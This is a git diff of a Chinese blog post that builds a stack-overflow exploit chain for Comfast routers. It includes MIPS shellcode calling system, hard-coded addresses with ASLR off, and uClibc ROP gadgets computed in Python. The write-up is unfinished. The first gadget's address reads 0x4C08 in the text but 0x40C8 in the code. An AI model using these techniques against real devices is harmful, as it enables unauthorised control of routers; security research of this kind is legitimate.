@@ -1,5 +1,5 @@
 ---
-title: Comfast 系列产品 /栈溢出通用利用链构造
+title: Comfast 系列产品 /栈溢出通用利用链构造 - 更新1
 published: true
 ---
 
@@ -53,7 +53,7 @@ De Bruijn 字符串的首地址为 0x2B2A655C
 跳到的地址 0x6361616C 正好是 caal，也正好是 De Brujin 字符串的第 244 - 248 个字节，在栈中地址为 0x2B2A6650. 接下来更改该序列：  
 1. 首先，更改栈返回地址将程序跳转至 0x2B2A6654，具体跳到哪里无所谓，只要跳到 `addiu $a0, $zero, 0x457` * 0xff 这个区间里面的任意地址就行. 
 2. 而后继续写下 0xff 个填充指令 `addiu $a0, $zero, 0x457` 用于缓冲  
-3. 准备完毕后，构造命令的执行 Payload，并将构建完毕的 Payload 接入填充指令的尾部，进而后续执行  
+3. 准备完毕后，构造命令的执行 Payload，并将构建完毕的 Payload 接入填充指令的尾部，进而后续执行(0x2B4002F0 是 system 函数的地址，此处未开启栈随机化，因此暂时拿 0x2B4002F0 作为其地址)  
 	```mips
 	li 	$a0, 0x2B2A7A58
 	li 	$t9, 0x2B4002F0
@@ -83,4 +83,39 @@ data0 += b"mkdir /12345"
 
 # [](#header-3)ROP
 
-明天再更新  
+此时我们的目标是跳到位于 0x2B4002F0 的 system 函数中(如下图所示，此处未开启栈随机化，因此暂时拿 0x2B4002F0 作为其地址). 
+
+![/image/cfac100/3.png](/image/cfac100/4.png)  
+
+由于此处我们无法直接控制 $a0 寄存器，不能够直接跳转到 system 函数中. 因此这里就要找两个 gadget，一个用来控制传参的 $s0 寄存器，一个用来控制 jalr 跳转到的 $t9 寄存器
+
+该固件直接加载 ld-uClibc-0.9.33.2.so，因此直接分析 uClibc 中的 ROP gadget 即可. 
+
+简单在 uClibc 中使用 mips gadget 找寻工具利用 mipsrop.find 了一下，发现了两条十分完美的 gadget: 
+
+1. 第一条在 uClibc 中的地址为 0x4C08，能控制 $s0 - $s7 之间的寄存器，并且其偏移地址为 0x180，远大于下下图所示的 0x12C，是十分理想的控制寄存器的 gadget.  
+   我们先让 PC 跳到这条 gadget 的起始地址 0x4C08
+   
+	![/image/cfac100/3.png](/image/cfac100/5.png)  
+	![/image/cfac100/3.png](/image/cfac100/6.png)  
+
+2. 第二条在 uClibc 中的地址为 0x53B4，首先 move $t9, $s5，而后旋即 jalr 到 $t9，我不得不承认 uClibc 中的这两条 gadget 搭配起来简直是天衣无缝.  
+   我们将上面那条 gadget 的 $ra 设置为 该条 gadget 的起始地址 0x53B4，方便 PC 跳到该 gadget
+   
+   ![/image/cfac100/3.png](/image/cfac100/7.png)  
+
+接下来写代码：首先根据偏移量，计算两条 gadget 的位置
+```py
+# 0x2B2B2550 		是 __uClibc_main 函数的起始地址
+# 0x68				是 __uClibc_main 函数起始至 __uClibc_main 函数末尾指令 jr $t9 的距离
+# 0x65B8			是 __uClibc_main 函数在 ld-uClibc-0.9.33.2.so 中指令 jr $t9 的地址
+
+# jalr $t9
+gadget_jalr_addr 	= 0x2B2B2550 + 0x68 - (0x65B8 - 0x53B4)
+# $s0 - $s7
+gadget_addr 		= 0x2B2B2550 + 0x68 - (0x65B8 - 0x40C8)
+```
+
+再通过 cyclic 生成 De Bruijn 序列探测一下各寄存器的赋值位置：
+
+由于时间很晚，并且这段时间本人很忙，明天再更新
